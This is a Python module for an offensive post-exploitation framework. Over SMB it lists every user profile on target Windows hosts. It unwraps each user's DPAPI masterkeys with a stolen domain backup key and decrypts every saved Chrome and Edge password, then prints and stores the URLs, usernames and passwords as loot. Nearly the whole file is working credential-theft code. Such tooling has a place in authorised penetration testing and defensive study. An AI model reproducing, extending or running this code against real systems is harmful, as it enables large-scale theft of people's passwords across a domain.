"""DPAPI browser credential triage: saved Chrome/Edge passwords out of
every domain user's profile, with the domain backup key (DPAPI stage 4).

Chain per profile (crypto shared in core/dpapi):

  1. unwrap the user's masterkeys with the backup key (stage 2)
  2. read the browser's Local State JSON: os_crypt.encrypted_key is
     base64 of b"DPAPI" + a DPAPI_BLOB — unwrap with the masterkey
     matched by GuidMasterKey -> the browser's 32-byte AES key
  3. read each profile's Login Data sqlite (stdlib sqlite3 over the
     raw bytes): every password_value is b"v10" + 12-byte nonce +
     AES-256-GCM — decrypt -> (origin_url, username, password)

v20 app-bound blobs are skipped by design (they can't be opened
off-box); a locked Login Data just reads through SMB on a quiet box.
Chrome and Edge share the format — both are walked.
"""

from core import dpapi as dpapix
from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None  # console gates run() on requirements

SKIP_DIRS = (".", "..", "Public", "Default", "Default User", "All Users")


class DpapiChrome(AuxiliaryModule):
    name = "DPAPI Browser Credential Triage (domain backup key)"
    description = """
        Walks a target's profiles over SMB and decrypts every saved
        Chrome/Edge password with the domain backup key (latest
        dpapi-backupkey loot, or KEY_LOOT to pick one): masterkeys
        unwrapped on the fly, the browser's Local State AES key opened
        by GuidMasterKey match, and each Login Data v10 blob decrypted
        (AES-256-GCM). (url, username, password) lands in creds + loot.
        v20 app-bound blobs are skipped by design.
    """
    authors = ["you"]
    requirements = ["impacket", "Cryptodome"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) with profiles, "
                                                "comma-separated"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Target admin"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("KEY_LOOT", default="",
                                   description="dpapi-backupkey loot label "
                                               "(blank = latest)"))

    def run(self):
        store = getattr(self.framework, "store", None)
        key, reason = dpapix.find_backup_key(
            store, str(self.get_option("KEY_LOOT") or "").strip())
        if key is None:
            self.print_error(reason)
            return
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._loot_host(host, key, store)

    def _loot_host(self, host, backup_key, store):
        try:
            conn = SMBConnection(host, host,
                                 sess_port=int(self.get_option("RPORT")),
                                 timeout=20)
            conn.login(str(self.get_option("USERNAME")),
                       str(self.get_option("PASSWORD")),
                       str(self.get_option("DOMAIN") or "."))
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            for user_dir in self._list(conn, "Users\\*"):
                if user_dir in SKIP_DIRS:
                    continue
                self._loot_user(conn, host, user_dir, backup_key, store)
        finally:
            conn.close()

    def _loot_user(self, conn, host, user_dir, backup_key, store):
        masterkeys = dpapix.build_masterkey_map(
            conn, user_dir, backup_key,
            lambda m: self.print_debug(f"{host}: {m}"))
        if not masterkeys:
            return
        for browser, rel in dpapix.BROWSER_DIRS.items():
            base = f"Users\\{user_dir}\\{rel}"
            local_state = self._read(conn, f"{base}\\Local State")
            if local_state is None:
                continue
            aes_key = dpapix.decrypt_browser_key(local_state, masterkeys)
            if aes_key is None:
                self.print_debug(f"{host}: {user_dir}/{browser}: Local "
                                 f"State key didn't unwrap")
                continue
            self._loot_browser(conn, host, user_dir, browser, base,
                               aes_key, store)

    def _loot_browser(self, conn, host, user_dir, browser, base,
                      aes_key, store):
        found = 0
        for profile in self._list(conn, f"{base}\\*"):
            if profile in (".", ".."):
                continue
            data = self._read(conn, f"{base}\\{profile}\\Login Data")
            if data is None:
                continue
            try:
                rows = dpapix.parse_login_data(data)
            except Exception as e:
                self.print_debug(f"{host}: {user_dir}/{browser}/"
                                 f"{profile}: sqlite: {e}")
                continue
            for url, username, pw_blob in rows:
                if not username:
                    continue
                plain = dpapix.decrypt_browser_login(pw_blob, aes_key)
                if plain is None:
                    self.print_debug(f"{host}: {user_dir}/{browser}/"
                                     f"{profile}: blob for {url} didn't "
                                     f"decrypt (v20 app-bound?)")
                    continue
                password = plain.decode("utf-8", "replace")
                found += 1
                self.print_good(f"{host}: {user_dir} [{browser}/{profile}] "
                                f"{url} — {username}:{password}")
                if store is not None:
                    store.add_cred(host, url, username, password,
                                   source="dpapi_chrome")
                    store.add_loot(
                        "credential",
                        f"{browser} credential {user_dir}/{profile} "
                        f"({url}) @ {host}",
                        f"{username}:{password}", address=host)
        if found:
            self.print_status(f"{host}: {user_dir} [{browser}]: {found} "
                              f"password(s) in loot")

    def _list(self, conn, pattern):
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)]
        except Exception:
            return []

    def _read(self, conn, path):
        try:
            buf = []
            conn.getFile("C$", path, buf.append)
            return b"".join(buf)
        except Exception:
            return None
